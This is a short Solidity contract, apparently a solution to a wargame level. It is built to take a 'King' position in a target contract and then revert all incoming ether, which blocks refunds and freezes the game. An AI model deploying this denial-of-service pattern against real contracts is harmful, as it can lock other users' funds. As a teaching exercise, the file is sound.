//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Quest09 is Ownable {
    constructor() payable {}

    function attack(address kingAddress) public onlyOwner {
        kingAddress.call{value: address(this).balance}("");
    }

    fallback() external payable {
        revert("I don't accept any ether sends to me");
    }
}
